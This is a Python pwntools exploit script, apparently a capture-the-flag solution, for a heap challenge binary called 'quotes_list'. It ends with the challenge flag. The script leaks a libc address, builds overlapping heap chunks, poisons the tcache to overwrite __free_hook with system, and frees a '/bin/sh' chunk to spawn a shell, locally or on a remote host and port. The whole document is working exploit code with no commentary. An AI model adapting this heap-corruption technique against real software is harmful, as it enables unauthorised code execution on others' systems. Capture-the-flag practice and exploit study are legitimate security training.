#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux', 'split-window', '-h']
elf = ELF('./quotes_list', checksec=False)

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
    libc = ELF('./libc.so.6', checksec=False)
else:
    r = elf.process(aslr=False)
    libc = ELF('./libc.so.6', checksec=False)
    gdb.attach(r, 'brva 0x10e6')

def create(length, content):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', length.__str__())
    r.sendafter(': ', content)

def edit(index, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', index.__str__())
    r.sendafter(': ', content)

def show(index):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', index.__str__())
    r.recvuntil(': ')
    return r.recvuntil('\n-----', drop=True)

def delete(index):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', index.__str__())

create(0x1000, '0')
create(0x18, '1')
create(0x18, '2')
create(0x18, '3')

delete(0)
create(0x18, '0')
libc.address = u64(show(0).ljust(8, '\x00')) - 0x3af230

edit(1, '\x00' * 0x18 + '\x71') # overlap
delete(2)
create(0x68, '2')

delete(3)
edit(2, '\x00' * 0x20 + p64(libc.symbols['__free_hook']))

create(0x18, '/bin/sh\x00') # 3
create(0x18, p64(libc.symbols['system'])) # 4

delete(3) # trigger free('/bin/sh') -> system('/bin/sh')

r.interactive()

# F#{th3r3_ar3_s0m3_n3ws_c0mm1ng_1nt0_libc-2.29}